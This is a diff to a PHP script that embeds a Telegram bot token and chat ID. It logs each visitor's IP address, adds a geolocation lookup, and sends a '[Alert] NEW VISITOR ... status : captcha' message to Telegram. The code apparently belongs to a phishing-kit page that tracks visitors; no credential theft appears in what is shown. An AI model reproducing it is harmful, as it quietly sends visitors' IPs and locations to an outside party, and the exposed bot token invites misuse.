@@ -107,14 +107,25 @@ error_reporting(E_ALL);
   $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
   $chatID = "1064643518";
 
-  // Capturing the Visitor's IP Address
+  
   $userIP = $_SERVER["REMOTE_ADDR"];
   $accessTime = date("Y-m-d H:i:s");
 
+  // Fetching the geolocation data
+  $geoUrl = "http://ip-api.com/json/$userIP";
+  $geoResponse = file_get_contents($geoUrl);
+  $geoData = json_decode($geoResponse, true);
+
+  // Extracting the country from the response
+  $country = $geoData['country'] ?? 'Unknown';
+
   // Message to Send
   $message = urlencode(
-      "[Alert] NEW VISITOR FROM IP : https://db-ip.com/$userIP , status : captcha"
+      "[Alert] NEW VISITOR FROM IP : $userIP, Country: $country, status : captcha"
   );
+
+  // Now you can use $message as needed
+
 
   // Telegram API URL for sending messages
   $telegramApi = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message";
